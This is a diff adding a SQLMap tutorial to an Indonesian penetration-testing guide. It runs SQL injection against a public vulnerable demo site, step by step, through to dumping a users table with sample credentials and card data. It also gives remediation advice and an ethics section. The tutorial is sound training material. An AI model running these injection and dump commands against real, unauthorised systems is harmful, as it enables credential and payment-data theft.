@@ -72,6 +72,123 @@ Pastikan untuk menghapus semua jejak yang ditinggalkan selama pengujian untuk me
 #### 8.2 Evaluasi Proses
 Tinjau proses pentesting untuk mengidentifikasi area yang dapat ditingkatkan di masa mendatang.
 
+## Penetration Testing dengan SQLMap
+
+### **Prasyarat**   
+1. **Target Uji**: `http://testphp.vulnweb.com/listproducts.php?cat=1` (situs demo rentan untuk pelatihan).  
+2. **Alat**: SQLMap (terinstal di Kali Linux).  
+
+### **Langkah 1: Pembaruan Repositori Sistem**  
+Sebelum memulai, pastikan sistem dan repositori paket diperbarui:  
+```bash  
+sudo apt update && sudo apt upgrade -y 
+```  
+**Tujuan**: Memastikan SQLMap dan dependensi terkini.  
+
+### **Langkah 2: Identifikasi Database yang Tersedia**  
+Jalankan perintah berikut untuk memindai database pada target:  
+```bash  
+sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbs  
+```  
+**Parameter**:  
+- `-u`: URL target dengan parameter rentan (`cat=1`).  
+- `--dbs`: Memerintahkan SQLMap menampilkan daftar database.  
+
+**Output Contoh**:  
+```  
+available databases [2]:  
+[*] acuart  
+[*] information_schema  
+```  
+**Interpretasi**:  
+- `acuart`: Database aplikasi target.  
+- `information_schema`: Database sistem MySQL.  
+
+### **Langkah 3: Enumerasi Tabel dalam Database**  
+Setelah mengetahui nama database (`acuart`), enumerasi tabel-tabel di dalamnya:  
+```bash  
+sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart --tables  
+```  
+**Parameter**:  
+- `-D acuart`: Menargetkan database "acuart".  
+- `--tables`: Menampilkan daftar tabel.  
+
+**Output Contoh**:  
+```  
+Database: acuart
+[8 tables]
++-----------+
+| artists   |
+| carts     |
+| categ     |
+| featured  |
+| guestbook |
+| pictures  |
+| products  |
+| users     |
++-----------+
+```  
+**Interpretasi**: Tabel `users` berisi data sensitif seperti kredensial.  
+
+### **Langkah 4: Identifikasi Kolom dalam Tabel "users"**  
+Eksplorasi struktur tabel `users` untuk mengetahui kolom yang tersedia:  
+```bash  
+sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart -T users --columns  
+```  
+**Parameter**:  
+- `-T users`: Menargetkan tabel "users".  
+- `--columns`: Menampilkan daftar kolom.  
+
+**Output Contoh**:  
+```  
+Database: acuart
+Table: users
+[8 columns]
++---------+--------------+
+| Column  | Type         |
++---------+--------------+
+| name    | varchar(100) |
+| address | mediumtext   |
+| cart    | varchar(100) |
+| cc      | varchar(100) |
+| email   | varchar(100) |
+| pass    | varchar(100) |
+| phone   | varchar(100) |
+| uname   | varchar(100) |
++---------+--------------+ 
+```  
+
+### **Langkah 5: Ekstraksi Data dari Tabel "users"**  
+Ekstrak seluruh data dari tabel `users` untuk analisis lebih lanjut:  
+```bash  
+sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart -T users --dump  
+```  
+**Parameter**:  
+- `--dump`: Mengekstrak dan menampilkan semua data dalam tabel.  
+
+**Output Contoh**:  
+```  
+Database: acuart
+Table: users
+[1 entry]
++---------------------+----------------------------------+------+-----------------+---------+-------+------------+-----------+
+| cc                  | cart                             | pass | email           | phone   | uname | name       | address   |
++---------------------+----------------------------------+------+-----------------+---------+-------+------------+-----------+
+| 1234-5678-2300-9000 | b91c87ff8783694b1193835fec1c2038 | test | email@email.com | 2323345 | test  | John Smith | 21 street |
++---------------------+----------------------------------+------+-----------------+---------+-------+------------+-----------+  
+```  
+**Interpretasi**: Data kredensial yang diekstrak menunjukkan kerentanan kritis pada aplikasi.  
+
+### **Langkah 6: Pelaporan Hasil**  
+Setelah eksploitasi, dokumentasikan temuan dalam laporan yang mencakup:  
+1. **Detail Kerentanan**: Parameter `cat=1` rentan terhadap SQL Injection.  
+2. **Risiko**: Akses tidak sah ke data pengguna.  
+3. **Rekomendasi**: Sanitasi input, penggunaan parameterized queries, dan pembaruan sistem.  
+
+### **Catatan Tambahan**  
+- Tambahkan parameter seperti `--level=5` (tingkat pemeriksaan maksimal) atau `--risk=3` (risiko eksploitasi tinggi) untuk simulasi mendalam.  
+- Uji teknik seperti Blind SQL Injection dengan menonaktifkan flag `--batch` untuk interaksi manual.  
+
 ## Etika dan Hukum
 Pelaksanaan pentesting harus mematuhi etika dan hukum yang berlaku. Pentester wajib menjaga kerahasiaan data yang diakses selama pengujian dan tidak menyalahgunakan informasi yang diperoleh.
 
